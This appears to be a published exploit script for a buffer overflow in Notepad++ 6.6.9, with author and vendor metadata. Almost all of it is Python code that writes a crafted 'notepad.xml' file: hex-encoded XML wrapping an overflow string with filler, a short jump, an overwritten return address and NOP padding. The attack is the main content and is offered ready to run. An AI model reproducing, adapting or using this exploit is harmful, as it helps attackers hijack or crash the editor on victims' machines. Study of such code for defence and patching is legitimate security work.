#!/usr/bin/python
# Exploit Title: NotePad++ v6.6.9 Buffer Overflow
# URL Vendor: http://notepad-plus-plus.org/
# Vendor Name: NotePad
# Version: 6.6.9
# Date: 22/12/2014
# CVE:  CVE-2014-1004
# Author: TaurusOmar   
# Twitter: @TaurusOmar_
# Email:  taurusomar13@gmail.com
# Home:  overhat.blogspot.com
# Risk: Medium

#Description:
#Notepad++ is a free (as in "free speech" and also as in "free beer") source code editor and Notepad replacement that supports several languages. 
#Running in the MS Windows environment, its use is governed by GPL License.
#Based on the powerful editing component Scintilla, Notepad++ is written in C++ and uses pure Win32 API and STL which ensures a higher execution speed 
#and smaller program size. By optimizing as many routines as possible without losing user friendliness, Notepad++ is trying to reduce the world carbon 
#dioxide emissions. When using less CPU power, the PC can throttle down and reduce power consumption, resulting in a greener environment.

#Proof Concept
#http://i.imgur.com/TTDtxJM.jpg

#Code
import struct
def little_endian(address):
  return struct.pack("<L",address)
poc ="\x41" * 591
poc+="\xeb\x06\x90\x90"
poc+=little_endian(0x1004C31F)
poc+="\x90" * 80
poc+="\x90" * (20000 - len(poc))
header = "\x3c\x3f\x78\x6d\x6c\x20\x76\x65\x72\x73\x69\x6f\x6e\x3d\x22\x31\x2e\x30\x22\x20\x65\x6e\x63\x6f\x64\x69\x6e\x67\x3d\x22"
header += "\x55\x54\x46\x2d\x38\x22\x20\x3f\x3e\x0a\x3c\x53\x63\x68\x65\x64\x75\x6c\x65\x3e\x0a\x09\x3c\x45\x76\x65\x6e\x74\x20\x55"
header += "\x72\x6c\x3d\x22\x22\x20\x54\x69\x6d\x65\x3d\x22\x68\x74\x74\x70\x3a\x2f\x2f\x0a" + poc
footer = "\x22\x20\x46\x6f\x6c\x64\x65\x72\x3d\x22\x22\x20\x2f\x3e\x0a\x3c\x2f\x53\x63\x68\x65\x64\x75\x6c\x65\x3e\x0a"
exploit =  header + footer
filename = "notepad.xml"
file = open(filename , "w")
file.write(exploit)
file.close()
